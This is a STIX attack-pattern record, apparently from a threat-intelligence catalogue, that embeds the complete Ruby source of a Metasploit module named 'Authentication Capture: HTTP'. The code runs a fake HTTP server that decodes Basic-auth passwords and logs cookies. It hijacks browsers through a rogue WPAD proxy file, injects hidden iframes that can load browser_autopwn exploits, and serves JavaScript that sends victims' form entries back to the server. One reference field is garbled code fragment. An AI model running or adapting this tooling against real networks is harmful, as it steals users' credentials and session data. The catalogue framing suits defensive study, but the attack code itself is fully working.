{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c471cf55-e5eb-45f9-9373-8402a1aedd4b",
    "created": "2024-08-14T16:22:00.823787Z",
    "modified": "2024-08-14T16:22:00.823791Z",
    "name": "Authentication Capture: HTTP",
    "description": " This module provides a fake HTTP service that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/http.rb",
            "external_id": "http.rb"
        },
        {
            "source_name": "prx=\"functionFindProxyForURL(url",
            "external_id": "host){returnPROXY#{mysrc}:#{@myport};}\""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n\n  def initialize\n    super(\n      'Name'        => 'Authentication Capture: HTTP',\n      'Description'    => %q{\n        This module provides a fake HTTP service that\n      is designed to capture authentication credentials.\n      },\n      'Author'      => ['ddz', 'hdm'],\n      'License'     => MSF_LICENSE,\n      'Actions'     =>\n        [\n          [ 'Capture', 'Description' => 'Run capture web server' ]\n        ],\n      'PassiveActions' =>\n        [\n          'Capture'\n        ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',    [ true, \"The local port to listen on.\", 80 ]),\n        OptPath.new('TEMPLATE',   [ false, \"The HTML template to serve in responses\",\n            File.join(Msf::Config.data_directory, \"exploits\", \"capture\", \"http\", \"index.html\")\n          ]\n        ),\n        OptPath.new('SITELIST',   [ false, \"The list of URLs that should be used for cookie capture\",\n            File.join(Msf::Config.data_directory, \"exploits\", \"capture\", \"http\", \"sites.txt\")\n          ]\n        ),\n        OptPath.new('FORMSDIR',   [ false, \"The directory containing form snippets (example.com.txt)\",\n            File.join(Msf::Config.data_directory, \"exploits\", \"capture\", \"http\", \"forms\")\n          ]\n        ),\n        OptAddress.new('AUTOPWN_HOST',[ false, \"The IP address of the browser_autopwn service \", nil ]),\n        OptPort.new('AUTOPWN_PORT',[ false, \"The SRVPORT port of the browser_autopwn service \", nil ]),\n        OptString.new('AUTOPWN_URI',[ false, \"The URIPATH of the browser_autopwn service \", nil ]),\n      ])\n  end\n\n  # Not compatible today\n  def support_ipv6?\n    false\n  end\n\n  def run\n    @formsdir = datastore['FORMSDIR']\n    @template = datastore['TEMPLATE']\n    @sitelist = datastore['SITELIST']\n    @myhost   = datastore['SRVHOST']\n    @myport   = datastore['SRVPORT']\n\n    @myautopwn_host =  datastore['AUTOPWN_HOST']\n    @myautopwn_port =  datastore['AUTOPWN_PORT']\n    @myautopwn_uri  =  datastore['AUTOPWN_URI']\n    @myautopwn      = false\n\n    if(@myautopwn_host and @myautopwn_port and @myautopwn_uri)\n      @myautopwn = true\n    end\n\n    exploit()\n  end\n\n  def on_client_connect(c)\n    c.extend(Rex::Proto::Http::ServerClient)\n    c.init_cli(self)\n  end\n\n  def on_client_data(cli)\n    begin\n      data = cli.get_once(-1, 5)\n      raise ::Errno::ECONNABORTED if !data or data.length == 0\n      case cli.request.parse(data)\n        when Rex::Proto::Http::Packet::ParseCode::Completed\n          dispatch_request(cli, cli.request)\n          cli.reset_cli\n        when  Rex::Proto::Http::Packet::ParseCode::Error\n          close_client(cli)\n      end\n    rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET\n    rescue ::OpenSSL::SSL::SSLError\n    rescue ::Exception\n      print_error(\"Error: #{$!.class} #{$!} #{$!.backtrace}\")\n    end\n\n    close_client(cli)\n  end\n\n  def close_client(cli)\n    cli.close\n    # Require to clean up the service properly\n    raise ::EOFError\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def dispatch_request(cli, req)\n\n    phost = cli.peerhost\n\n    os_name = nil\n    os_type = nil\n    os_vers = nil\n    os_arch = 'x86'\n\n    ua_name = nil\n    ua_vers = nil\n\n    ua = req['User-Agent']\n\n    case (ua)\n      when /rv:([\\d\\.]+)/\n        ua_name = 'FF'\n        ua_vers = $1\n      when /Mozilla\\/[0-9]\\.[0-9] \\(compatible; MSIE ([0-9]+\\.[0-9]+)/\n        ua_name = 'IE'\n        ua_vers = $1\n      when /Version\\/(\\d+\\.\\d+\\.\\d+).*Safari/\n        ua_name = 'Safari'\n        ua_vers = $1\n    end\n\n    case (ua)\n      when /Windows/\n        os_name = 'Windows'\n      when /Linux/\n        os_name = 'Linux'\n      when /iPhone/\n        os_name = 'iPhone'\n        os_arch = 'armle'\n      when /Mac OS X/\n        os_name = 'Mac'\n    end\n\n    case (ua)\n      when /PPC/\n        os_arch = 'ppc'\n    end\n\n    os_name ||= 'Unknown'\n\n    mysrc = Rex::Socket.source_address(cli.peerhost)\n    hhead = (req['Host'] || @myhost)\n\n    if req.resource =~ /^http\\:\\/+([^\\/]+)(\\/*.*)/\n      hhead = $1\n      req.resource = $2\n    end\n\n    if hhead =~ /^(.*):(\\d+)\\s*$/\n      hhead = $1\n      nport = $2.to_i\n    end\n\n    @myport = nport || 80\n\n\n    cookies = req['Cookie'] || ''\n\n\n    if(cookies.length > 0)\n      report_note(\n        :host => cli.peerhost,\n        :type => \"http_cookies\",\n        :data => hhead + \" \" + cookies,\n        :update => :unique_data\n      )\n    end\n\n\n    if(req['Authorization'] and req['Authorization'] =~ /basic/i)\n      basic,auth = req['Authorization'].split(/\\s+/)\n      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)\n\n      report_cred(\n        ip: cli.peerhost,\n        port: @myport,\n        service_name: (ssl ? \"https\" : \"http\"),\n        user: user,\n        pass: pass,\n        proof: req.resource.to_s\n      )\n\n      report_note(\n        :host     => cli.peerhost,\n        :type     => \"http_auth_extra\",\n        :data     => req.resource.to_s,\n        :update => :unique_data\n      )\n      print_good(\"HTTP LOGIN #{cli.peerhost} > #{hhead}:#{@myport} #{user} / #{pass} => #{req.resource}\")\n    end\n\n\n    if(req.resource =~ /^\\/*wpad.dat|.*\\.pac$/i)\n      prx = \"function FindProxyForURL(url, host) { return 'PROXY #{mysrc}:#{@myport}'; }\"\n      res =\n        \"HTTP/1.1 200 OK\\r\\n\" +\n        \"Host: #{hhead}\\r\\n\" +\n        \"Content-Type: application/x-ns-proxy-autoconfig\\r\\n\" +\n        \"Content-Length: #{prx.length}\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\n#{prx}\"\n      print_status(\"HTTP wpad.dat sent to #{cli.peerhost}\")\n      cli.put(res)\n      return\n    end\n\n\n    if(req.resource =~ /\\/+formrec\\/(.*)/i)\n      data = Rex::Text.uri_decode($1).split(\"\\x00\").join(\", \")\n\n      report_note(\n        :host => cli.peerhost,\n        :type => \"http_formdata\",\n        :data => hhead + \" \" + data,\n        :update => :unique_data\n      )\n\n      res =\n        \"HTTP/1.1 200 OK\\r\\n\" +\n        \"Host: #{hhead}\\r\\n\" +\n        \"Content-Type: text/html\\r\\n\" +\n        \"Content-Length: 4\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\nBYE!\"\n\n      print_status(\"HTTP form data received for #{hhead} from #{cli.peerhost} (#{data})\")\n      cli.put(res)\n      return\n    end\n\n    report_note(\n      :host => cli.peerhost,\n      :type => \"http_request\",\n      :data => \"#{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers}\",\n      :update => :unique_data\n    )\n\n    print_status(\"HTTP REQUEST #{cli.peerhost} > #{hhead}:#{@myport} #{req.method} #{req.resource} #{os_name} #{ua_name} #{ua_vers} cookies=#{cookies}\")\n\n    if(req.resource =~ /\\/+forms.html$/)\n      frm = inject_forms(hhead)\n      res =\n        \"HTTP/1.1 200 OK\\r\\n\" +\n        \"Host: #{hhead}\\r\\n\" +\n        \"Content-Type: text/html\\r\\n\" +\n        \"Content-Length: #{frm.length}\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\n#{frm}\"\n      cli.put(res)\n      return\n    end\n\n\n    # http://us.version.worldofwarcraft.com/update/PatchSequenceFile.txt\n    if(req.resource == \"/update/PatchSequenceFile.txt\")\n      print_status(\"HTTP #{cli.peerhost} is trying to play World of Warcraft\")\n    end\n\n\n    # Microsoft 'Network Connectivity Status Indicator' Vista\n    if (req['Host'] == 'www.msftncsi.com')\n      print_status(\"HTTP #{cli.peerhost} requested the Network Connectivity Status Indicator page (Vista)\")\n      data = \"Microsoft NCSI\"\n      res  =\n        \"HTTP/1.1 200 OK\\r\\n\" +\n        \"Host: www.msftncsi.com\\r\\n\" +\n        \"Expires: 0\\r\\n\" +\n        \"Cache-Control: must-revalidate\\r\\n\" +\n        \"Content-Type: text/html\\r\\n\" +\n        \"Content-Length: #{data.length}\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\n#{data}\"\n      cli.put(res)\n      return\n    end\n\n=begin\n    # Apple 'Network Status' Check (prevents a pop-up safari on the iphone)\n    if(req['Host'] == 'www.apple.com' and req.resource == '/library/test/success.html')\n      data = \"\\x3c\\x21\\x44\\x4f\\x43\\x54\\x59\\x50\\x45\\x20\\x48\\x54\\x4d\\x4c\\x20\\x50\\x55\\x42\\x4c\\x49\\x43\\x20\\x22\\x2d\\x2f\\x2f\\x57\\x33\\x43\\x2f\\x2f\\x44\\x54\\x44\\x20\\x48\\x54\\x4d\\x4c\\x20\\x33\\x2e\\x32\\x2f\\x2f\\x45\\x4e\\x22\\x3e\\x0a\\x3c\\x48\\x54\\x4d\\x4c\\x3e\\x0a\\x3c\\x48\\x45\\x41\\x44\\x3e\\x0a\\x09\\x3c\\x54\\x49\\x54\\x4c\\x45\\x3e\\x53\\x75\\x63\\x63\\x65\\x73\\x73\\x3c\\x2f\\x54\\x49\\x54\\x4c\\x45\\x3e\\x0a\\x3c\\x2f\\x48\\x45\\x41\\x44\\x3e\\x0a\\x3c\\x42\\x4f\\x44\\x59\\x3e\\x0a\\x53\\x75\\x63\\x63\\x65\\x73\\x73\\x0a\\x3c\\x2f\\x42\\x4f\\x44\\x59\\x3e\\x0a\\x3c\\x2f\\x48\\x54\\x4d\\x4c\\x3e\\x0a\"\n      res  =\n        \"HTTP/1.1 200 OK\\r\\n\" +\n        \"Host: www.apple.com\\r\\n\" +\n        \"Expires: 0\\r\\n\" +\n        \"Cache-Control: must-revalidate\\r\\n\" +\n        \"Content-Type: text/html\\r\\n\" +\n        \"Content-Length: #{data.length}\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\n#{data}\"\n      cli.put(res)\n      return\n    end\n=end\n\n    # Microsoft ActiveX Download\n    if (req['Host'] == 'activex.microsoft.com')\n      print_status(\"HTTP #{cli.peerhost} attempted to download an ActiveX control\")\n      data = \"\"\n      res  =\n        \"HTTP/1.1 404 Not Found\\r\\n\" +\n        \"Host: #{mysrc}\\r\\n\" +\n        \"Content-Type: application/octet-stream\\r\\n\" +\n        \"Content-Length: #{data.length}\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\n#{data}\"\n      cli.put(res)\n      return\n    end\n\n\n    # Sonic.com's Update Service\n    if (req['Host'] == 'updateservice.sonic.com')\n      print_status(\"HTTP #{cli.peerhost} is running a Sonic.com product that checks for online updates\")\n    end\n\n    # The google maps / stocks view on the iPhone\n    if (req['Host'] == 'iphone-wu.apple.com')\n      case req.resource\n      when '/glm/mmap'\n        print_status(\"HTTP #{cli.peerhost} is using Google Maps on the iPhone\")\n      when '/dgw'\n        print_status(\"HTTP #{cli.peerhost} is using Stocks/Weather on the iPhone\")\n      else\n        print_status(\"HTTP #{cli.peerhost} is request #{req.resource} via the iPhone\")\n      end\n    end\n\n    # The itunes store on the iPhone\n    if(req['Host'] == 'phobos.apple.com')\n      print_status(\"HTTP #{cli.peerhost} is using iTunes Store on the iPhone\")\n      # GET /bag.xml\n    end\n\n\n    # Handle image requests\n    ctypes  =\n    {\n      \"jpg\"   => \"image/jpeg\",\n      \"jpeg\"  => \"image/jpeg\",\n      \"png\"   => \"image/png\",\n      \"gif\"   => \"image/gif\",\n    }\n\n    req_ext = req.resource.split(\".\")[-1].downcase\n\n    if(ctypes[req_ext])\n      ctype = ctypes['gif']\n\n      data =\n        \"\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\\x01\\x00\\x80\\x00\" +\n        \"\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\x2c\\x00\\x00\\x00\\x00\" +\n        \"\\x01\\x00\\x01\\x00\\x00\\x02\\x02\\x44\\x01\\x00\\x3b\"\n\n      res =\n        \"HTTP/1.1 200 OK\\r\\n\" +\n        \"Host: #{mysrc}\\r\\n\" +\n        \"Content-Type: #{ctype}\\r\\n\" +\n        \"Content-Length: #{data.length}\\r\\n\" +\n        \"Connection: Close\\r\\n\\r\\n#{data}\"\n      cli.put(res)\n      return\n    end\n\n\n    buff = ''\n\n\n    if(@myautopwn)\n      buff << \"<iframe src='http://#{@myautopwn_host}:#{@myautopwn_port}#{@myautopwn_uri}'></iframe>\"\n    end\n\n    list = File.readlines(@sitelist)\n    list.each do |site|\n      next if site =~ /^#/\n      site.strip!\n      next if site.length == 0\n      buff << \"<iframe src='http://#{site}:#{@myport}/forms.html'></iframe>\"\n    end\n\n    data = File.read(@template)\n    data.gsub!(/%CONTENT%/, buff)\n\n    res  =\n      \"HTTP/1.1 200 OK\\r\\n\" +\n      \"Host: #{mysrc}\\r\\n\" +\n      \"Expires: 0\\r\\n\" +\n      \"Cache-Control: must-revalidate\\r\\n\" +\n      \"Content-Type: text/html\\r\\n\" +\n      \"Content-Length: #{data.length}\\r\\n\" +\n      \"Connection: Close\\r\\n\\r\\n#{data}\"\n\n    cli.put(res)\n    return\n\n  end\n\n\n  def inject_forms(site)\n\n    domain = site.gsub(/(\\.\\.|\\\\|\\/)/, \"\")\n    domain = \"www.\" + domain if domain !~ /^www/i\n\n    while(domain.length > 0)\n\n      form_file = File.join(@formsdir, domain) + \".txt\"\n      form_data = \"\"\n      if (File.readable?(form_file))\n        form_data = File.read(form_file)\n        break\n      end\n\n      parts = domain.split(\".\")\n      parts.shift\n      domain = parts.join(\".\")\n    end\n\n    %|\n<html>\n<head>\n  <script language=\"javascript\">\n    function processForms() {\n      var i = 0;\n      while(form = document.forms[i]) {\n\n        res = \"\";\n        var x = 0;\n        var f = 0;\n\n        while(e = form.elements[x]) {\n          if (e.name.length > 0 && e.value.length > 0 && e.value != \"on\"){\n            res += e.name + \"=\" + e.value + \"\\x00\";\n            f=1;\n          }\n          x++;\n        }\n\n        if(f) {\n          url = \"http://\"+document.domain+\":#{@myport}/formrec/\" + escape(res);\n          fra = document.createElement(\"iframe\");\n          fra.setAttribute(\"src\", url);\n          fra.style.visibility = 'hidden';\n          document.body.appendChild(fra);\n        }\n\n        i++;\n      }\n    }\n  </script>\n</head>\n<body onload=\"processForms()\">\n\n#{form_data}\n\n</body>\n</html>\n|\n\n  end\nend\n"
}